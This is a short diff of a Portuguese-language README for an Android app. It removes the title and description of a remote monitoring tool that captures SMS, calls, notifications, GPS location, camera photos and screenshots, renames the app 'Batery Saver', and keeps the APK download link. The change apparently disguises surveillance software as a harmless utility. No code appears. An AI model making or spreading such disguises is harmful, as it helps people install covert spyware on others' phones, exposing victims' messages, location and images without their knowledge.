@@ -1,6 +1,4 @@
-# Idle - Sistema Anti-Roubo e Monitoramento
-
-Sistema de monitoramento remoto para dispositivos Android. Capture SMS, chamadas, notificações, localização GPS, fotos da câmera e screenshots em tempo real.
+# Batery Saver
 
 [![Download APK](https://img.shields.io/badge/Download-APK-green?style=for-the-badge)](https://github.com/seu-usuario/idle/releases/latest)
 
